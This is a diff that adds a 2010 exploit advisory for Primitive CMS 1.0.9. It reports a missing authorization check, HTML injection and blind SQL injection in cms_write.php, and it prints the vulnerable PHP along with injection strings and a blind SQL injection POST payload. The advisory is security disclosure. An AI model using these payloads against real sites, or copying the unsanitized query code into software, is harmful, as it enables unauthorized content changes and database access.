@@ -1,0 +1,57 @@
+# Exploit Title: Primitive CMS 1.0.9 Multiple Vulnerabilities
+# Date: 20.09.2010
+# Author: Stephan Sattler // Solidmedia.de
+# Software Website: http://www.bouzouste.info/
+# Software Link: http://www.bouzouste.info/link/click.php?id=1
+# Version: 1.0.9
+
+
+[Vulnerability 1]
+
+# Unauthorized Access
+
+Url: http://[site]/[cmspath]/cms_write.php
+
+In cms_write.php is no check if the user has administration rights.
+Because of that, there are 2 more vulnerabilities.
+
+
+
+[Vulnerability 2]
+
+# Html Injection
+
+Url: http://[site]/[cmspath]/cms_write.php
+
+Vulnerable Code (cms_write.php line 13-25): 
+
+$title=$_POST[title];
+$content=$_POST[content];
+$menutitle=$_POST[menutitle];
+$sql="INSERT INTO `prim_page` ( `id` , `title` , `content`, `menutitle` ) VALUES ('', '$title', '$content', '$menutitle')";
+mysql_query($sql);
+
+
+The title, Menu-title  and Content a user can submit are inserted directly into
+the database and inserted in the html-code on the page without
+and sanitizing at all.
+
+Example for the Title: </title><h1>Testtitle</h1>
+Example for the Menu-Title: </a><h2>Menutitle</h2>
+
+
+[Vulnerability 3]
+
+# Blind SQL-Injection // PoC
+
+Url: http://[site]/[cmspath]/cms_write.php
+
+Vulnerable Code (cms_write.php line 13-16):
+
+$title=$_POST[title];
+$menutitle=$_POST[menutitle];
+$sqlcheck="SELECT * FROM prim_page WHERE title='$title' or menutitle='$menutitle' ";
+
+Postdata for Injection: title=&menutitle=home' AND (SELECT 1)='1&content=&submit=OK
+One can inject via title or menutitle, both are vulnerable. On success, you'll see the message: "H selida yparxei"
+
